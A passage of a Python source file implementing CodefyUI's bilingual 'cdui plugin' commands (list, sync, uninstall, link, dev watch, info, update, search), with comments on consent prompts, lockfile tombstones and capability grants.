    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )

    ok(
        f"安裝完成：{plugin_id} ({short_sha})",
        f"Installed: {plugin_id} ({short_sha})",
    )
    return 0


def _print_available_builtins() -> None:
    """Name the built-in packs sitting on disk uninstalled.

    `cdui plugin list` is where the docs send a student whose node is missing
    (I0-0 says so in as many words), so a pack the update dropped on disk but
    never registered has to be visible from here — otherwise "it is not
    installed" and "it does not exist" look identical.
    """
    available = available_builtin_packs()
    if not available:
        return
    section("可安裝的內建外掛（尚未安裝）", "Built-in packs available (not installed)")
    width = max(len(pid) for pid, _ in available) + 2
    for pack_id, name in available:
        print(f"  {BOLD}{pack_id.ljust(width)}{RESET}{name}")
    # One verb instead of a hand-typed id list (#175): the list grows with every
    # release, and copying five ids off a terminal is exactly the step people
    # skip — after which the nodes are missing and nothing says why.
    info(
        "全部安裝：cdui plugin sync（單獨安裝：cdui plugin install <id>）",
        "Install them all with: cdui plugin sync  "
        "(or one at a time: cdui plugin install <id>)",
    )


def cmd_list(args: argparse.Namespace) -> int:
    lockfile = load_lockfile()
    plugins = lockfile.get("plugins", {})
    if not plugins:
        info("尚未安裝任何外掛", "No plugins installed yet")
        _print_available_builtins()
        return 0

    section("已安裝外掛", "Installed plugins")
    width = max(len(pid) for pid in plugins) + 2
    for plugin_id, entry in sorted(plugins.items()):
        manifest = entry.get("manifest", {})
        name = manifest.get("name", plugin_id)
        version = manifest.get("version", "")
        kind = entry.get("source_kind", "")
        src = entry.get("source", "")
        enabled = entry.get("enabled", True)
        bits: list[str] = []
        if version:
            bits.append(f"v{version}")
        bits.append(f"{kind}:{src}")
        if entry.get("sha"):
            bits.append(entry["sha"][:7])
        # "Which of my plugins can reach the network" should be answerable
        # without opening a lockfile in a text editor.
        granted = normalize_capabilities(entry.get("capabilities"))
        if granted:
            bits.append(f"[{', '.join(granted)}]")
        if enabled:
            # Normal layout — bold id, plain name, dim metadata.
            print(
                f"  {BOLD}{plugin_id.ljust(width)}{RESET}{name}  {DIM}{'  '.join(bits)}{RESET}"
            )
        else:
            # Whole row dimmed + explicit [disabled] tag so it's obvious
            # the plugin is installed but inactive.
            print(
                f"  {DIM}{plugin_id.ljust(width)}{name}  [disabled]  {'  '.join(bits)}{RESET}"
            )
    _print_available_builtins()
    return 0


# ── sync (#175) ────────────────────────────────────────────────────────────

def _prune_stale_lockfile_keys(lockfile: dict[str, Any]) -> list[tuple[str, str]]:
    """Drop lockfile keys for built-in packs that no longer exist.

    ``install_plugin_finder`` skips an entry whose manifest is missing without
    a word (plugin_loader.py), which is right for discovery and useless for the
    user: a pack a release dropped lingers in the lockfile forever as an entry
    that loads nothing and explains nothing. Dead tombstones go the same way —
    remembering that someone removed a pack that no longer ships is not a
    decision worth keeping.

    Only ``builtin`` entries are pruned. Their files ship with the release, so
    "not on disk" is final; a ``local`` link points at the author's own checkout,
    which can be missing today and back tomorrow, and a ``github_url`` pack's
    directory is user data this command has no business deleting behind a flag
    named ``--prune``.

    Returns ``(id, reason)`` pairs. The caller saves and reports.
    """
    catalog = builtin_catalog_packs()
    builtin_root = plugins_builtin_root()
    dropped: list[tuple[str, str]] = []

    for plugin_id, entry in sorted(lockfile.get("plugins", {}).items()):
        if not isinstance(entry, dict) or entry.get("source_kind") != "builtin":
            continue
        if plugin_id not in catalog:
            dropped.append((plugin_id, t("已不在內建型錄中", "no longer in the catalog")))
        elif not (builtin_root / plugin_id / MANIFEST_FILENAME).exists():
            dropped.append((plugin_id, t("磁碟上找不到 manifest", "no manifest on disk")))
    for plugin_id, _reason in dropped:
        lockfile["plugins"].pop(plugin_id, None)

    for plugin_id in sorted(removed_ids(lockfile)):
        if plugin_id not in catalog:
            clear_removed(lockfile, plugin_id)
            dropped.append(
                (plugin_id, t("移除記錄已無對應外掛", "removal record for a pack that is gone"))
            )
    return dropped


#: Sentinel for "there was no way to ask" — no terminal, or stdin closed
#: under one. Distinct from a plain ``False``, which is a human answering no:
#: a decision is a success (exit 0) and an unanswerable question is not
#: (exit 1), and conflating them made `cdui plugin sync </dev/null` print
#: "pass --yes" and then exit 0 as though it had done what was asked.
SYNC_UNANSWERABLE = None


def _confirm_sync(count: int) -> bool | None:
    """Ask once before installing ``count`` packs.

    ``True`` proceed, ``False`` the user said no, :data:`SYNC_UNANSWERABLE`
    nobody could be asked.

    Fails closed with no terminal, like :func:`capability_gate`: a sync in a CI
    job or behind a pipe must not block on an ``input()`` nobody will answer,
    and must not silently decide yes on the user's behalf either — installing
    code someone did not ask for is the exact thing #175 refused to automate.
    On Windows the prompt is reachable at all only because ``dev.py`` re-execs
    the venv interpreter through ``subprocess.run`` (see ``_reexec``); with
    ``os.execv`` the console was orphaned and every prompt read EOF.
    """
    def _no_terminal() -> None:
        err(
            "沒有終端可確認。要直接安裝請加 --yes，只想看清單請用 --dry-run。",
            "No terminal to confirm at. Pass --yes to install, "
            "or --dry-run to just see the list.",
        )

    if not _stdin_is_interactive():
        _no_terminal()
        return SYNC_UNANSWERABLE
    prompt = t(f"要安裝以上 {count} 個外掛嗎？", f"Install these {count} pack(s)?")
    try:
        answer = input(f"  {prompt} [y/N]: ").strip().lower()
    except EOFError:
        # ``isatty()`` said yes and stdin was closed anyway — `sync < /dev/null`
        # on Windows does exactly this. Same fail-closed answer as the branch
        # above, and the same exit code, because the question was never asked.
        print()
        _no_terminal()
        return SYNC_UNANSWERABLE
    if answer not in ("y", "yes"):
        warn("已取消（未安裝任何東西）", "Cancelled (nothing was installed)")
        return False
    return True


def cmd_sync(args: argparse.Namespace) -> int:
    """Install every built-in pack this install has not yet decided about.

    The gap this closes (#175): built-in packs ship on disk with an update, but
    only a lockfile entry activates them and nothing re-syncs it — so a pack a
    release added is installable and invisible at the same time, and the only
    cure was typing an id list nobody knew existed. Two shapes were rejected on
    the way here, both for the same reason: activating packs at startup, and
    prompting during `cdui update`, would install code the user never asked for
    because a release shipped it. That is a consent decision, and this command
    is where it is given — once, deliberately, for everything pending.

    A pack the user uninstalled is not pending: uninstall leaves a tombstone
    (see :func:`cmd_uninstall`) and sync names it as skipped rather than
    quietly re-installing it. Per-pack exit codes, so one pack whose
    ``python_deps`` cannot be downloaded on a school network does not decide
    the fate of the other four.
    """
    section("同步內建外掛", "Syncing built-in packs")
    lockfile = load_lockfile()

    dry_run = bool(getattr(args, "dry_run", False))
    if getattr(args, "prune", False):
        # The in-memory prune happens either way so the pending list below is a
        # faithful preview, but under --dry-run nothing is saved: a flag whose
        # whole promise is "changes nothing" must not quietly edit the lockfile
        # because a second flag was also passed.
        pruned = _prune_stale_lockfile_keys(lockfile)
        if not pruned:
            info("沒有需要清除的 lockfile 項目", "Nothing stale to prune")
        elif dry_run:
            for plugin_id, reason in pruned:
                info(
                    f"--dry-run：會清除 lockfile 項目 {plugin_id}（{reason}）",
                    f"--dry-run: would prune lockfile entry '{plugin_id}' ({reason})",
                )
        else:
            save_lockfile(lockfile)
            for plugin_id, reason in pruned:
                ok(
                    f"已清除 lockfile 項目 {plugin_id}（{reason}）",
                    f"Pruned lockfile entry '{plugin_id}' ({reason})",
                )

    catalog = builtin_catalog_packs()
    installed = lockfile.get("plugins", {})
    tombstoned = removed_ids(lockfile)

    pending = sorted(
        (pack_id, str(entry.get("name") or pack_id))
        for pack_id, entry in catalog.items()
        if pack_id not in installed and pack_id not in tombstoned
    )
    skipped = sorted(
        pack_id for pack_id in catalog
        if pack_id in tombstoned and pack_id not in installed
    )
    if skipped:
        info(
            f"略過你先前移除的外掛：{', '.join(skipped)}"
            f"（要裝回請執行 cdui plugin install <id>）",
            f"Skipping packs you removed: {', '.join(skipped)} "
            f"(bring one back with `cdui plugin install <id>`)",
        )

    if not pending:
        ok(
            "每個內建外掛都已有決定，沒有要同步的項目",
            "Every built-in pack is accounted for — nothing to sync",
        )
        return 0

    width = max(len(pack_id) for pack_id, _ in pending) + 2
    for pack_id, name in pending:
        print(f"  {BOLD}{pack_id.ljust(width)}{RESET}{name}")

    if dry_run:
        info(
            f"--dry-run：以上 {len(pending)} 個都不會安裝",
            f"--dry-run: none of these {len(pending)} pack(s) were installed",
        )
        return 0

    if not getattr(args, "yes", False):
        answer = _confirm_sync(len(pending))
        if answer is SYNC_UNANSWERABLE:
            # Nothing was installed and the message named --yes: that is a
            # failure to carry out the command, and scripts have to see it.
            return 1
        if not answer:
            # "No" is a complete answer, not an error.
            return 0

    done: list[str] = []
    failed: list[str] = []
    for pack_id, _name in pending:
        # Re-read per pack: _install_catalog saves the lockfile object it is
        # handed, so carrying one copy across the loop would write the state
        # from before the previous pack straight back over it.
        lockfile = load_lockfile()
        rc = _install_catalog(
            pack_id,
            argparse.Namespace(
                force=False,
                no_confirm=True,
                trust_author=False,
                accept_capabilities=False,
                prior_capabilities=[],
            ),
            lockfile,
        )
        if rc == 0:
            done.append(pack_id)
            continue
        failed.append(pack_id)
        warn(
            f"{pack_id} 安裝失敗，繼續處理其餘外掛",
            f"{pack_id} failed — continuing with the rest",
        )

    if failed:
        err(
            f"完成：成功 {len(done)} 個，失敗 {len(failed)} 個"
            f"（{', '.join(failed)}）。修正原因後可再執行 cdui plugin sync。",
            f"Done: {len(done)} installed, {len(failed)} failed "
            f"({', '.join(failed)}). Re-run `cdui plugin sync` once the cause is fixed.",
        )
        return 1
    ok(
        f"完成：已安裝 {len(done)} 個內建外掛",
        f"Done: installed {len(done)} built-in pack(s)",
    )
    return 0


def _set_enabled(plugin_id: str, enabled: bool) -> int:
    """Shared body for ``cmd_enable`` / ``cmd_disable``.

    Flips the ``enabled`` field on the lockfile entry, persists, and asks
    the running server to hot-reload its registry. Returns CLI exit code.
    """
    verb_zh = "啟用" if enabled else "停用"
    verb_en = "Enabling" if enabled else "Disabling"
    section(f"{verb_zh}外掛：{plugin_id}", f"{verb_en} plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(
            f"找不到外掛 {plugin_id}（請先 install）",
            f"Plugin '{plugin_id}' is not installed (run install first)",
        )
        return 1

    current = entry.get("enabled", True)
    if current == enabled:
        state_zh = "已啟用" if enabled else "已停用"
        state_en = "already enabled" if enabled else "already disabled"
        info(f"{plugin_id} {state_zh}（無動作）", f"{plugin_id} is {state_en} (no-op)")
        return 0

    entry["enabled"] = enabled
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    done_zh = "已啟用" if enabled else "已停用"
    done_en = "Enabled" if enabled else "Disabled"
    ok(f"{done_zh} {plugin_id}", f"{done_en} {plugin_id}")
    return 0


def cmd_enable(args: argparse.Namespace) -> int:
    return _set_enabled(args.plugin_id.lower(), True)


def cmd_disable(args: argparse.Namespace) -> int:
    return _set_enabled(args.plugin_id.lower(), False)


def cmd_uninstall(args: argparse.Namespace) -> int:
    plugin_id = args.plugin_id.lower()
    section(f"移除外掛：{plugin_id}", f"Uninstalling plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
        return 1

    if entry.get("source_kind") == "github_url":
        plugin_dir = plugins_user_root() / plugin_id
        if plugin_dir.exists():
            try:
                shutil.rmtree(plugin_dir)
            except OSError as e:
                err(f"刪除失敗：{e}", f"Failed to remove {plugin_dir}: {e}")
                return 1

    lockfile["plugins"].pop(plugin_id, None)

    # Remember the decision instead of merely forgetting the pack (#175).
    # Popping the entry made "never installed" and "removed on purpose" the
    # same state, so `cdui plugin sync` would have to either re-install what the
    # user just threw away or nag about it forever. Only built-in packs are
    # tombstoned: they are the only ones sync can put back uninvited, and a
    # tombstone nothing reads is dead data the user would still have to explain.
    is_builtin = (
        entry.get("source_kind") == "builtin"
        or plugin_id in builtin_catalog_packs()
    )
    if is_builtin:
        mark_removed(lockfile, plugin_id, source_kind=entry.get("source_kind"))
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    ok(f"已移除 {plugin_id}", f"Removed {plugin_id}")
    if is_builtin:
        info(
            f"cdui plugin sync 不會再把 {plugin_id} 裝回來；"
            f"要拿回它請執行 cdui plugin install {plugin_id}",
            f"`cdui plugin sync` will not bring {plugin_id} back. When you want "
            f"it again, run `cdui plugin install {plugin_id}`.",
        )
    return 0


def _link_local(root: Path, *, force: bool) -> int:
    """Link a local plugin directory in place — shared by ``link`` and ``dev``.

    Records ``source_kind="local"`` with the directory's absolute ``path`` in the
    lockfile, so the loader walks the author's own working tree. The AST security
    gate is skipped — this is your own code — but a warning is printed, matching
    the built-in/catalog trust model.
    """
    section(f"連結本地外掛：{root}", f"Linking local plugin: {root}")

    if not (root / MANIFEST_FILENAME).exists():
        err(
            f"目錄缺少 {MANIFEST_FILENAME}：{root}",
            f"No {MANIFEST_FILENAME} found in {root}",
        )
        return 1

    try:
        manifest = read_manifest(root)
        validate_manifest(manifest)
    except (ValueError, FileNotFoundError) as e:
        err(str(e), str(e))
        return 1

    plugin_id = manifest["plugin"]["id"]

    if plugin_id in load_catalog().get("plugins", {}):
        err(
            f"id '{plugin_id}' 與內建套件衝突，請在 manifest 改用其他 id",
            f"id '{plugin_id}' collides with a built-in pack — rename it in the manifest",
        )
        return 1

    lockfile = load_lockfile()
    if plugin_id in lockfile.get("plugins", {}) and not force:
        err(
            f"外掛 {plugin_id} 已安裝/連結。加 --force 覆寫。",
            f"Plugin '{plugin_id}' is already installed/linked. Use --force to overwrite.",
        )
        return 1

    info(f"id：{plugin_id}", f"id: {plugin_id}")
    warn(
        "本地連結會跳過 AST 安全檢查（視為你信任的程式碼）",
        "Local link skips the AST security gate (treated as your own trusted code)",
    )
    if _manifest_has_frontend(manifest):
        warn(
            "此外掛含前端 JS，會在編輯器中以完整權限執行",
            "This plugin ships frontend JS that runs in the editor with full access",
        )

    deps = manifest.get("python_deps", {})
    if deps:
        info(
            f"安裝 python_deps：{', '.join(deps)}",
            f"Installing python_deps: {', '.join(deps)}",
        )
        rc = _install_deps(deps)
        if rc != 0:
            return rc

    allowed = manifest.get("security", {}).get("allowed_modules") or []
    # Recorded, not prompted: a linked plugin is the author's own working
    # tree and the AST gate is skipped for it entirely (see the warning
    # above), so asking for consent to a subset of what is already unchecked
    # would be misleading. Recording it still means `cdui plugin list` and
    # `info` tell the truth about what this plugin declares.
    capabilities = manifest_capabilities(manifest)
    lockfile.setdefault("plugins", {})[plugin_id] = {
        "source_kind": "local",
        "source": str(root),
        "path": str(root),
        "installed_at": now_iso(),
        "manifest": manifest.get("plugin", {}),
        "trusted_modules": list(allowed),
        "capabilities": list(capabilities),
        "enabled": True,
    }
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )
    ok(
        f"已連結：{plugin_id}（編輯後執行 cdui plugin reload 更新）",
        f"Linked: {plugin_id} (run `cdui plugin reload` after edits to refresh)",
    )
    return 0


def cmd_link(args: argparse.Namespace) -> int:
    """Link a local plugin directory for development — loaded in place, no copy.

    The dev-loop counterpart to ``install``: instead of downloading a tarball, it
    points the lockfile at the author's own working tree. Edits are picked up by
    ``cdui plugin reload`` (or the next ``cdui start``); ``cdui plugin dev``
    automates that.
    """
    return _link_local(Path(args.path).expanduser().resolve(), force=args.force)


def cmd_unlink(args: argparse.Namespace) -> int:
    """Remove a linked local plugin — drops the lockfile entry only.

    Unlike ``uninstall``, this never deletes files: a linked plugin's files are
    the author's own working directory. Refuses non-local entries so a real
    install isn't silently dropped.
    """
    plugin_id = args.plugin_id.lower()
    section(f"取消連結：{plugin_id}", f"Unlinking plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
        return 1
    if entry.get("source_kind") != "local":
        err(
            f"{plugin_id} 不是本地連結（請改用 cdui plugin uninstall）",
            f"'{plugin_id}' is not a local link — use `cdui plugin uninstall` instead",
        )
        return 1

    lockfile["plugins"].pop(plugin_id, None)
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    ok(
        f"已取消連結 {plugin_id}（你的檔案未被刪除）",
        f"Unlinked {plugin_id} (your files were not deleted)",
    )
    return 0


def cmd_reload(args: argparse.Namespace) -> int:
    """Ask the running server to hot-reload nodes/presets.

    The manual trigger for the dev loop: edit a linked plugin, then
    ``cdui plugin reload`` to see the change without restarting the server.
    """
    section("熱重載外掛", "Reloading plugins")
    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
        return 0
    info(
        "伺服器未運行（啟動後變更會自動載入）",
        "Server not running (changes load on next start)",
    )
    return 0


def _scan_plugin_files(root: Path) -> dict[str, float]:
    """mtime signature of a plugin's reload-relevant files.

    Covers the manifest plus everything under ``nodes/``, ``presets/`` and
    ``frontend/`` — the directories whose changes affect a running editor.
    ``__pycache__`` and other files (README, ``ui/`` source before it is built)
    are ignored so editor-irrelevant saves don't trigger reloads.
    """
    sig: dict[str, float] = {}
    manifest = root / MANIFEST_FILENAME
    if manifest.is_file():
        try:
            sig[str(manifest)] = manifest.stat().st_mtime
        except OSError:
            pass
    for sub in ("nodes", "presets", "frontend"):
        d = root / sub
        if not d.is_dir():
            continue
        for f in d.rglob("*"):
            if f.is_file() and "__pycache__" not in f.parts:
                try:
                    sig[str(f)] = f.stat().st_mtime
                except OSError:
                    pass
    return sig


def cmd_dev(args: argparse.Namespace) -> int:
    """Link a local plugin and watch it, hot-reloading on every change.

    The one-command dev loop: links the directory (idempotent), then polls its
    manifest / nodes / presets / frontend for edits and POSTs
    ``/api/plugins/reload`` whenever something changes. Run the server in another
    terminal (``cdui start`` / ``cdui dev``). Python edits take effect on the
    next reload; a changed frontend bundle additionally needs a browser refresh.
    ``--once`` links + reloads a single time and exits (no watch).
    """
    root = Path(args.path).expanduser().resolve()
    rc = _link_local(root, force=True)
    if rc != 0:
        return rc
    if getattr(args, "once", False):
        return 0

    interval = max(0.2, float(getattr(args, "interval", 1.0) or 1.0))
    section("開發監看模式", "Dev watch mode")
    info(
        f"監看 {root}（每 {interval:g}s 檢查一次，Ctrl+C 結束）",
        f"Watching {root} (polling every {interval:g}s; Ctrl+C to stop)",
    )
    sig = _scan_plugin_files(root)
    try:
        while True:
            time.sleep(interval)
            new_sig = _scan_plugin_files(root)
            if new_sig == sig:
                continue
            sig = new_sig
            info("偵測到變更，重載中…", "Change detected, reloading…")
            if _backend_reload():
                ok(
                    "熱重載完成（前端變更請重新整理瀏覽器）",
                    "Hot-reloaded (refresh the browser for frontend changes)",
                )
            else:
                warn("伺服器未運行", "Server not running")
    except KeyboardInterrupt:
        print()
        info("已停止監看", "Stopped watching")
    return 0


def cmd_info(args: argparse.Namespace) -> int:
    spec = args.source_or_id
    lockfile = load_lockfile()

    if spec.lower() in lockfile.get("plugins", {}):
        plugin_id = spec.lower()
        entry = lockfile["plugins"][plugin_id]
        plugin_dir = (
            plugins_builtin_root() / plugin_id
            if entry.get("source_kind") == "builtin"
            else plugins_user_root() / plugin_id
        )
        manifest: dict[str, Any]
        try:
            manifest = read_manifest(plugin_dir)
        except (FileNotFoundError, OSError):
            manifest = {"plugin": entry.get("manifest", {})}
        _print_info(plugin_id, manifest, entry, plugin_dir, installed=True)
        return 0

    try:
        kind, a, b, ref = parse_source(spec)
    except ValueError as e:
        err(str(e), str(e))
        return 2

    owner, repo = a, b
    if kind == "catalog":
        catalog_row = catalog_entry(a)
        if catalog_row is not None and catalog_row.kind == "github":
            # The catalog's own words first, then the live repository. In that
            # order because the catalog answers "is this the pack I meant, and
            # does CodefyUI vouch for it" even when the network half below
            # cannot be reached, and because `official` is a claim only the
            # catalog is entitled to make.
            _print_catalog_row(catalog_row)
            owner, _, repo = (catalog_row.repo or "").partition("/")
            ref = catalog_row.ref
        else:
            raw_row = load_catalog()["plugins"][a]
            plugin_dir = plugins_builtin_root() / a
            try:
                manifest = read_manifest(plugin_dir)
            except FileNotFoundError:
                manifest = {"plugin": {"name": raw_row.get("name", a)}}
            synthetic_entry = {
                "source_kind": "builtin",
                "source": a,
                "manifest": manifest.get("plugin", {}),
            }
            _print_info(a, manifest, synthetic_entry, plugin_dir, installed=False)
            return 0

    try:
        sha = resolve_sha(owner, repo, ref)
    except RuntimeError as e:
        err(str(e), str(e))
        return 1
    try:
        manifest = tomllib.loads(core_github.fetch_manifest_text(owner, repo, sha))
    except (GitHubError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
        raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/{MANIFEST_FILENAME}"
        err(f"無法取得 manifest：{e}", f"Could not fetch manifest from {raw}: {e}")
        return 1
    synthetic_entry = {
        "source_kind": "github_url",
        "source": f"{owner}/{repo}" + (f"@{ref}" if ref else ""),
        "url": f"https://github.com/{owner}/{repo}",
        "ref": ref,
        "sha": sha,
        "manifest": manifest.get("plugin", {}),
    }
    _print_info(manifest.get("plugin", {}).get("id", "(unnamed)"), manifest, synthetic_entry, None, installed=False)
    return 0


def _print_catalog_row(entry: core_catalog.CatalogEntry) -> None:
    """What this install's catalog says about a repository pack.

    Everything here is the catalog's claim, not the repository's: the name a
    student saw in ``cdui plugin search``, the repo the installer will
    actually fetch, and whether CodefyUI vouches for it. A manifest fetched
    from the repository can say anything at all, so ``official`` in
    particular has to come from this side of the line.

    The field layout matches :func:`_print_info`, which prints the live
    details straight after, so the two blocks read as one answer.
    """
    section(f"目錄項目：{entry.id}", f"Catalog entry: {entry.id}")
    fields: list[tuple[str, str]] = [("name", entry.name)]
    if entry.description:
        fields.append(("description", entry.description))
    if entry.repo:
        fields.append(("repo", entry.repo))
    if entry.homepage:
        fields.append(("homepage", entry.homepage))
    if entry.tags:
        fields.append(("tags", ", ".join(entry.tags)))
    fields.append((
        "official",
        t("是，由 CodefyUI 發布", "yes, published by CodefyUI")
        if entry.official
        else t("否（第三方外掛）", "no (third-party plugin)"),
    ))

    width = max(len(k) for k, _ in fields) + 2
    for k, v in fields:
        print(f"  {DIM}{(k + ':').ljust(width)}{RESET} {v}")


def _print_info(
    plugin_id: str,
    manifest: dict[str, Any],
    entry: dict[str, Any],
    plugin_dir: Path | None,
    *,
    installed: bool,
) -> None:
    plugin_meta = manifest.get("plugin", {}) or {}
    lessons_meta = manifest.get("lessons", {}) or {}
    deps = manifest.get("python_deps", {}) or {}
    status_zh = "已安裝" if installed else "未安裝"
    status_en = "INSTALLED" if installed else "AVAILABLE"
    print(f"\n{BOLD}{plugin_id}{RESET}  {DIM}[{t(status_zh, status_en)}]{RESET}")

    fields: list[tuple[str, str]] = []
    if plugin_meta.get("name"):
        fields.append(("name", plugin_meta["name"]))
    if plugin_meta.get("version"):
        fields.append(("version", plugin_meta["version"]))
    if plugin_meta.get("description"):
        fields.append(("description", plugin_meta["description"]))
    if entry.get("source_kind"):
        fields.append(("source", f"{entry['source_kind']}:{entry.get('source', '')}"))
    if entry.get("sha"):
        fields.append(("sha", entry["sha"][:12]))
    if entry.get("url"):
        fields.append(("url", entry["url"]))
    if lessons_meta.get("chapters"):
        fields.append(("chapters", ", ".join(lessons_meta["chapters"])))
    if lessons_meta.get("lessons"):
        fields.append(("lessons", ", ".join(lessons_meta["lessons"])))
    if deps:
        fields.append(("deps", ", ".join(f"{k}{v}" for k, v in deps.items())))
    # For an INSTALLED plugin the lockfile is the only truthful source, even
    # when it says "none": falling back to the manifest on a falsy value meant
    # a plugin that shipped `capabilities = ["network"]` in a manifest it
    # rewrote after install was displayed as if that had been granted. For a
    # plugin that is not installed there is no grant yet, and the manifest's
    # ask is exactly what you want to read before agreeing to it.
    if installed:
        granted = normalize_capabilities(entry.get("capabilities"))
    else:
        granted = manifest_capabilities(manifest)
    if granted:
        fields.append(("capabilities", ", ".join(granted)))
    if entry.get("trusted_modules"):
        fields.append(("trusted modules", ", ".join(entry["trusted_modules"])))

    width = max(len(k) for k, _ in fields) + 2 if fields else 0
    for k, v in fields:
        print(f"  {DIM}{(k + ':').ljust(width)}{RESET} {v}")

    if installed and plugin_dir is not None and (plugin_dir / "nodes").exists():
        nodes = sorted(
            f.stem for f in (plugin_dir / "nodes").glob("*.py")
            if not f.name.startswith("_") and f.name != "__init__.py"
        )
        print(f"  {DIM}{'nodes:'.ljust(width)}{RESET} {', '.join(nodes) if nodes else '(none)'}")

    if installed and plugin_dir is not None:
        readme = plugin_dir / "README.md"
        if readme.exists():
            try:
                preview = "\n".join(readme.read_text(encoding="utf-8").splitlines()[:8])
            except OSError:
                preview = ""
            if preview:
                print(f"\n  {DIM}README.md preview:{RESET}")
                for line in preview.splitlines():
                    print(f"    {line}")


def cmd_update(args: argparse.Namespace) -> int:
    lockfile = load_lockfile()
    if args.plugin_id:
        ids = [args.plugin_id.lower()]
    else:
        ids = sorted(lockfile.get("plugins", {}).keys())

    if not ids:
        info("沒有可更新的外掛", "No plugins to update")
        return 0

    updated = 0
    skipped = 0
    for plugin_id in ids:
        entry = lockfile.get("plugins", {}).get(plugin_id)
        if not entry:
            err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
            return 1

        kind = entry.get("source_kind")
        if kind == "builtin":
            info(
                f"{plugin_id}: 內建包，請以 cdui update 更新",
                f"{plugin_id}: built-in pack — update with `cdui update`",
            )
            skipped += 1
            continue

        if kind != "github_url":
            warn(f"{plugin_id}: 未知的 source_kind {kind!r}", f"{plugin_id}: unknown source_kind {kind!r}")
            skipped += 1
            continue

        url = entry.get("url", "")
        m = _GITHUB_URL.match(url) or _GITHUB_SHORT.match(entry.get("source", ""))
        if not m:
            err(f"{plugin_id}: 無法解析來源 {url or entry.get('source')}",
                f"{plugin_id}: could not parse source")
            return 1
        owner, repo = m.group(1), m.group(2)
        ref = entry.get("ref", "") or ""

        try:
            new_sha = resolve_sha(owner, repo, ref or "HEAD")
        except RuntimeError as e:
            err(f"{plugin_id}: {e}", f"{plugin_id}: {e}")
            return 1

        if new_sha == entry.get("sha"):
            info(
                f"{plugin_id}: 已是最新版 ({new_sha[:7]})",
                f"{plugin_id}: already up to date ({new_sha[:7]})",
            )
            skipped += 1
            continue

        section(
            f"更新 {plugin_id}: {entry.get('sha', '')[:7]} {ARROW} {new_sha[:7]}",
            f"Updating {plugin_id}: {entry.get('sha', '')[:7]} {ARROW} {new_sha[:7]}",
        )
        # ``prior_capabilities`` is what makes an update non-interactive
        # WITHOUT being a silent re-grant: the gate waves through a manifest
        # asking for no more than the lockfile already records, and stops on
        # one that grew a capability since the version the user consented to.
        # Capability creep across an update is the supply-chain shape worth
        # catching, and it is the only one an update can catch.
        synthetic_args = argparse.Namespace(
            force=True,
            no_confirm=True,
            trust_author=bool(entry.get("trusted_modules")),
            accept_capabilities=False,
            prior_capabilities=list(entry.get("capabilities") or []),
        )
        rc = _install_github(owner, repo, ref, synthetic_args, lockfile)
        if rc != 0:
            return rc
        updated += 1
        # Reload lockfile so subsequent iterations see the new install state.
        lockfile = load_lockfile()

    ok(
        f"完成：更新 {updated} 個，略過 {skipped} 個",
        f"Done: updated {updated}, skipped {skipped}",
    )
    return 0


def cmd_search(args: argparse.Namespace) -> int:
    catalog = load_catalog()
    plugins = catalog.get("plugins", {})
    if not plugins:
        info("目錄為空", "Catalog is empty")
        return 0

    query = (args.query or "").lower().strip()
    lockfile_ids = set(load_lockfile().get("plugins", {}).keys())

    matches: list[tuple[str, dict[str, Any]]] = []
    for plugin_id, entry in plugins.items():
        haystack = " ".join([
            plugin_id,
            entry.get("name", ""),
            entry.get("description", ""),
            # The repository is searchable too: someone who has the GitHub
            # page open has "CodefyUI-Plugin-Graph-Copilot" in front of them
            # and no reason to guess that the catalog calls it graph-copilot.
            entry.get("repo", "") or "",
            " ".join(entry.get("chapters", []) or []),
            " ".join(entry.get("tags", []) or []),
        ]).lower()
        if not query or query in haystack:
            matches.append((plugin_id, entry))

    if not matches:
        info(
            f"找不到符合 '{args.query}' 的項目",
            f"No catalog entries match '{args.query}'",
        )
        return 0

    section(f"目錄 ({len(matches)})", f"Catalog ({len(matches)} entries)")
    width = max(len(pid) for pid, _ in matches) + 2
    for plugin_id, entry in sorted(matches):
        marker = f"{GREEN}{MARK_INSTALLED}{RESET}" if plugin_id in lockfile_ids else " "
        # Say where a pack comes from. Installing a github entry downloads and
        # runs someone else's code, which activating a built-in pack does not,
        # and "official" is the catalog saying whose code it is.
        if entry.get("kind") == "github":
            tag = " [github, official]" if entry.get("official") else " [github]"
        else:
            tag = ""
        print(
            f"  {marker} {BOLD}{plugin_id.ljust(width)}{RESET}"
            f"{entry.get('name', plugin_id)}{DIM}{tag}{RESET}"
        )
        desc = entry.get("description", "")
        if desc:
            print(f"    {' ' * width}{DIM}{desc}{RESET}")
    print(f"\n  {DIM}{t(f'{MARK_INSTALLED} = 已安裝', f'{MARK_INSTALLED} = installed')}{RESET}")
    return 0


# ── scaffolding (cdui plugin new) ────────────────────────────────────────────

# The scaffold payload ships next to this module (scripts/templates/plugin/),
# so `cdui plugin new` works from any repo checkout the CLI runs from. types.ts
# under ui/src/sdk/ is generated from the canonical contract by
# scripts/sync_plugin_sdk.py (guarded by tests/test_plugin_dx.py).
_TEMPLATE_ROOT = Path(__file__).resolve().parent / "templates" / "plugin"

# Appended to the manifest only with --ui, so backend-only plugins don't carry a
# [frontend] entry pointing at a bundle they will never build.
_FRONTEND_STANZA = (
    "\n[frontend]\n"
